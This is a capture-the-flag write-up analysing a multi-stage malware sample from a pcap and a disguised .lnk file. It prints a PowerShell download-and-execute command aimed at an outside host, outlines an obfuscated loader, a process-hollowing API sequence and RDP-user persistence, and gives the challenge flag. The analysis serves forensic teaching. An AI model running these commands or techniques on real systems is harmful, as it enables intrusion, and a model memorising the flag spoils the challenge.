# Time Dilation — malware forensics, hard — 1000 pts

**Flag:** `HTB{h3avy_Pr0cc3s_h0ll0w1ng_l3ads_t0_s1ngular1ty!}`

Handout: `time.pcap` (202 KB) and `BlackHole Time Dilation Calculator.lnk` (1546 bytes).

---

## Step 0 — the name is a lie

A challenge called "Time Dilation" shipping a pcap invites exactly one hypothesis: a **timing covert
channel** in inter-packet delays. We went in expecting to extract `frame.time_epoch` deltas and look
for a bimodal distribution.

**There is no covert channel.** The astronomy theme (BlackHole, Singularity, Antares, Canopus) is
pure flavour. It is a straightforward five-stage unpacking chain — and the hard part is stage 5's
cryptography, not the network.

Worth stating plainly because the misdirection is the most expensive part of this challenge.

## Stage 1 — the `.lnk`

Parse the shell-link structure (LECmd, or by hand):

```
powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://windowsliveupdater.com/r.ps1')
```

The `TrackerDataBlock` leaks build-host forensics:

```
MachineID  rigel
MAC        08:00:27:f4:3a:4d      (VirtualBox OUI)
SID        S-1-5-21-573959750-2113261706-2597967625-1001
NAME_STRING "Calculate Time Dialation"          (sic)
```

## Stage 2 — the pcap

45 packets, one TCP conversation `192.168.1.130 ↔ 77.74.198.52:80`, two GETs.

```console
$ tshark -r time.pcap --export-objects http,out/
```

yields `r.ps1` (2030 B) and `mal.vbs` (196108 B).

## Stage 3 — `r.ps1`

A `-join [char[]](…)` decimal array piped into `. ($shEllId[1]+$sHeLLid[13]+'x')` — a
string-construction trick for `iex`. It downloads `windowsliveupdater.com/mal.vbs` to
`$env:TEMP/<10 random chars>.vbs`, hides it, and runs it with `wscript.exe` via SysWOW64 PowerShell
(`-ep bypass -windowstyle hidden`).

## Stage 4 — `mal.vbs`

A **DotNetToJScript** BinaryFormatter gadget (`System.DelegateSerializationHolder` →
`Assembly.Load(byte[])`), entry class `SpaceTravel.Singularity`.

Carve it: concatenate every `"…"` literal, base64-decode, find the `MZ`.

## Stage 5 — `Mono_dll.dll`

A .NET assembly (PDB path `C:\Users\melkor\source\repos\Mono_dll\`). No ILSpy or mono on the box and
`dotnet tool install -g ilspycmd` fails, so the IL was dumped with **`dnfile` + `dncil`**.

`Singularity..ctor` does three interesting things:

**1. A seed derived from a file's magic bytes.**

```csharp
vbc = @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe";   // else download it
seed = BitConverter.ToUInt16(File.ReadAllBytes(vbc), 0);          // 0x5A4D == "MZ" == 23117
passphrase = Convert.ToBase64String(new Random(seed).NextBytes(32));
```

`new Random(23117)` is **fully deterministic**. To reproduce the passphrase you must reimplement
**.NET Framework's** `Random` — Knuth's subtractive generator, with `NextBytes` = `InternalSample() % 256`.
(.NET Core changed the algorithm; the Framework one is required here.)

```
passphrase = NjJYbGlMDTRU+/EFoHt8+VKJ0hdjmvCSLZNI6WDHaA0=
```

**2. It is Rijndael-256, not AES.**

```csharp
salt = blob[0:32]; iv = blob[32:64]; ct = blob[64:]
key  = PBKDF2-HMAC-SHA1(passphrase, salt, 299 iterations, 32 bytes)
// Rijndael with BlockSize = 256, CBC, PKCS7
```

AES is Rijndael restricted to a 128-bit block. With `BlockSize = 256` this is the wider Rijndael
variant, which **pycryptodome cannot do** — `pip install rijndael`, or hand-roll it. Note the
non-standard **299** PBKDF2 iterations.

The plaintext is itself base64, decoding to the stage-3 PE.

**3. Process hollowing.**

`CMemoryExecute.Run(pe, vbc.exe, "")` — the textbook sequence: `CreateProcess` SUSPENDED →
`NtUnmapViewOfSection` → `VirtualAllocEx` → `NtWriteVirtualMemory` → `NtGetContextThread` →
`NtSetContextThread` → `NtResumeThread`. A signed Microsoft binary (`vbc.exe`) ends up running
attacker code.

## Stage 6 — the payload, and the flag

A 40 KB native x86 PE that calls `IsUserAnAdmin`, `NetUserAdd` to create user **`Antares`**, and
`NetLocalGroupAddMembers` to place it in **Remote Desktop Users** — persistence via RDP.

The 50-byte password buffer at `0x407b8c` is decoded in place at `0x401580` by XOR with the
repeating key:

```
"Canopus - Alpha Carinae"
```

**That decoded password is the flag.**

---

## Lessons

- **Test the obvious channels before the clever one.** Before building a timing-analysis rig, check
  HTTP objects, IP IDs, TCP sequence/window fields, ICMP payloads and DNS names. Here
  `--export-objects` ended the network phase in one command.
- **Reusable: when a .NET sample derives a key from `new Random(seed)`, reimplement .NET Framework's
  Random in Python.** It is deterministic, and the seed is usually a constant lifted from a known
  file — here the `MZ` magic of `vbc.exe`.
- **Check the block size before assuming AES.** `RijndaelManaged` with `BlockSize = 256` is a
  different cipher for your tooling even though it is the same algorithm family.
- `dnfile` + `dncil` will dump .NET IL anywhere Python runs — no ILSpy, no mono, no Windows.
- Thematic naming is a legitimate misdirection device. Let the artifacts, not the title, set the
  hypothesis.
